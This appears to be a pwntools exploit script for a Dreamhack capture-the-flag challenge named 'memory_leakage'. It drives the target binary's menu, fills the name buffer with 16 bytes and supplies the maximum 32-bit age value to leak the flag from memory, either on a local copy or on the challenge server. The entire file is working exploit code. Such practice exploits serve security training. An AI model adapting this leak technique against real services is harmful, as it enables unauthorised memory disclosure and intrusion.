from pwn import *
import sys

context.log_level="debug"

if len(sys.argv)!=2:
    log.info("try 'python ex.py -l' for local")
    log.info("try 'python ex.py -r' for remote")
    exit(0)

if sys.argv[1]=="-r":
    p = remote('host1.dreamhack.games',8995)
elif sys.argv[1]=="-l":
    p = process('memory_leakage')
else:
    log.info("options: -l for local, -r for remote")
    exit(0)

p.recvuntil("> ")

p.sendline("3")
p.recvuntil("> ")
p.sendline("1")

p.recvuntil("Name: ")
p.sendline("A"*16)

p.recvuntil("Age: ")

p.sendline(str(4294967295))

p.recvuntil("> ")
p.sendline("2")
log.info("FLAG: "+p.recv())